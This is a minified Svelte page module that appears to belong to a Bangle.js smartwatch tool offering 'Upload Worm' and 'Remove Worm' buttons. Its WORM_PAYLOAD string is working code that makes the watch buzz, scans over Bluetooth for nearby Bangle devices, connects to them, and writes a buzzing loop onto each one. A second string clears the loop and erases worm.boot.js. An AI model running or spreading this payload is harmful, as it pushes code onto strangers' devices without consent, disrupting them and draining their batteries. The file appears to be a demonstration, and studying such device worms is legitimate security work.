import{S as D,i as R,s as T,y as w,a as v,z as k,c as p,A as y,b,g as O,d as S,B as q,h as u,I as A,k as d,q as B,l as _,m as h,r as N,n as W,G as m,M as z,H as E,N as I}from"../chunks/index.5c2a7ae1.js";import{C as U,a as x,s as C,c as M}from"../chunks/Controls.927ec693.js";const J=`let connect = function (r) { var k, l, m, n, f, h = { write: function (a) { return new Promise(function b(g, e) { a.length ? (n.writeValue(a.substr(0, 20)).then(function () { b(g, e) }).catch(e), a = a.substr(20)) : g() }) }, disconnect: function () { return k.disconnect() }, eval: function (a) { return new Promise(function (c, g) { function e() { var d = b.indexOf("\\n"); if (0 <= d) { clearTimeout(p); f = p = void 0; var q = b.substr(0, d); try { c(JSON.parse(q)) } catch (t) { g(q) } b.length > d + 1 && h.emit("data", b.substr(d + 1)) } } var b = ""; var p = setTimeout(e, 5E3); f = function (d) { b += d; 0 <= b.indexOf("\\n") && e() }; h.write("\\u0003\\u0010Bluetooth.write(JSON.stringify(" + a + ")+'\\\\n')\\n").then(function () { }) }) } }; return r.gatt.connect().then(function (a) { k = a; return k.getPrimaryService("6e400001-b5a3-f393-e0a9-e50e24dcca9e") }).then(function (a) { l = a; return l.getCharacteristic("6e400002-b5a3-f393-e0a9-e50e24dcca9e") }).then(function (a) { n = a; return l.getCharacteristic("6e400003-b5a3-f393-e0a9-e50e24dcca9e") }).then(function (a) { m = a; m.on("characteristicvaluechanged", function (c) { c = E.toString(c.target.value.buffer); f ? f(c) : h.emit("data", c) }); return m.startNotifications() }).then(function () { return h }) };
let WORM_PAYLOAD = setInterval(() => {
    Bangle.buzz();
    console.log('Buzz!');
    NRF.requestDevice({ filters: [{ namePrefix: 'Bangle' }] }).then((dev) => {
        connect(dev).then((u) => u.write('setInterval(() => { Bangle.buzz();}, 5000);\\n'));
    });
}, 5000);
`,L=`clearInterval(WORM_PAYLOAD);
require('Storage').erase('worm.boot.js');
`;function P(s){let t,o,c,a,r,n,e,i;return{c(){t=d("div"),o=d("button"),c=B("Upload Worm"),a=v(),r=d("button"),n=B("Remove Worm"),this.h()},l(f){t=_(f,"DIV",{id:!0,class:!0});var l=h(t);o=_(l,"BUTTON",{});var g=h(o);c=N(g,"Upload Worm"),g.forEach(u),a=p(l),r=_(l,"BUTTON",{});var $=h(r);n=N($,"Remove Worm"),$.forEach(u),l.forEach(u),this.h()},h(){W(t,"id","worm-commands"),W(t,"class","svelte-8q5v8f")},m(f,l){b(f,t,l),m(t,o),m(o,c),m(t,a),m(t,r),m(r,n),e||(i=[z(o,"click",s[3]),z(r,"click",s[4])],e=!0)},p:E,d(f){f&&u(t),e=!1,I(i)}}}function V(s){let t,o,c,a,r;t=new U({});let n=s[0]&&P(s);return a=new x({}),{c(){w(t.$$.fragment),o=v(),n&&n.c(),c=v(),w(a.$$.fragment)},l(e){k(t.$$.fragment,e),o=p(e),n&&n.l(e),c=p(e),k(a.$$.fragment,e)},m(e,i){y(t,e,i),b(e,o,i),n&&n.m(e,i),b(e,c,i),y(a,e,i),r=!0},p(e,[i]){e[0]?n?n.p(e,i):(n=P(e),n.c(),n.m(c.parentNode,c)):n&&(n.d(1),n=null)},i(e){r||(O(t.$$.fragment,e),O(a.$$.fragment,e),r=!0)},o(e){S(t.$$.fragment,e),S(a.$$.fragment,e),r=!1},d(e){q(t,e),e&&u(o),n&&n.d(e),e&&u(c),q(a,e)}}}function Y(s,t,o){let c;A(s,M,i=>o(0,c=i));async function a(){await C(J.replace(`
`,""))}async function r(){await C(L)}return[c,a,r,()=>a(),()=>r()]}class G extends D{constructor(t){super(),R(this,t,Y,V,T,{})}}export{G as default};
